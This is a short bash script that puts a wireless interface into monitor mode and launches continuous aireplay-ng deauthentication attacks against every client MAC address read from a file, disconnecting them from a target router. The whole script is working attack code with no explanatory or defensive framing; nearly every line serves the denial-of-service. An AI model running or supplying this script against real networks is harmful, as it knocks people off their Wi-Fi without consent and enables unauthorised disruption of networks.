#!/bin/bash

router_mac=$(sudo cat _gateway/BSSID.txt)
interface=$(sudo cat _gateway/IF.txt)
mac_to_deauth=$(sudo cat store/txt/file.txt)

sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
sudo airodump-ng "$interface" 
# python3 get_mac_ch.py
sudo bash deauth_2.sh
for val in $mac_to_deauth
do
sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"&
done
sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
sudo service NetworkManager restart
